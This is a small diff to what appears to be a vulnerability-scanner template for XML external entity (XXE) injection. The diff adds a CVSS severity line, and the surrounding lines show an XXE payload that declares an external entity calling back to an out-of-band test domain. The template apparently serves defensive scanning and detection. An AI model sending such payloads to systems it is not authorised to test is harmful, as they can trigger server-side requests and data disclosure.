@@ -4,6 +4,7 @@ family: xxe
 severity: high
 cwe: CWE-611
 owasp: WSTG-INPV-07
+cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
 inject_into: [body, json]
 payloads:
   - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{oast_domain}}/\">]><r>&x;</r>"
